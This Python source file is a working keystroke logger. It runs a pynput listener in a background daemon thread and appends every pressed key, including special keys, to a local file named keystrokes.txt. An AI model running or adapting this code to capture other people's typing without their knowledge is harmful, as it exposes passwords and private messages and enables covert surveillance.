import threading
from pynput import keyboard
from logger_setup import log

LOG_FILE = "keystrokes.txt"

class KeyListener(threading.Thread):
    def __init__(self):
        super().__init__()
        self.daemon = True
        self.listener = None
        self.running = False

    def on_press(self, key):
        """Callback for when a key is pressed"""
        try:
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                f.write(f'{key.char}')
        except AttributeError:
            # Handle special keys (e.g., space, enter)
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                key_name = str(key).replace("Key.", "")
                if key_name == "space":
                    f.write(" ")
                elif key_name == "enter":
                    f.write("\n")
                else:
                    f.write(f" [{key_name.upper()}] ")
        
        # If the listener was told to stop, this will break the loop
        if not self.running:
            return False

    def run(self):
        """Starts the key listener"""
        log.info("Key listener thread started.")
        self.running = True
        try:
            with keyboard.Listener(on_press=self.on_press) as self.listener:
                self.listener.join()
        except Exception as e:
            log.error(f"Key listener crashed: {e}")
        log.info("Key listener thread stopped.")

    def stop_listening(self):
        """Stops the key listener"""
        log.info("Stopping key listener...")
        self.running = False
        if self.listener:
            # This will stop the listener's join() loop
            self.listener.stop()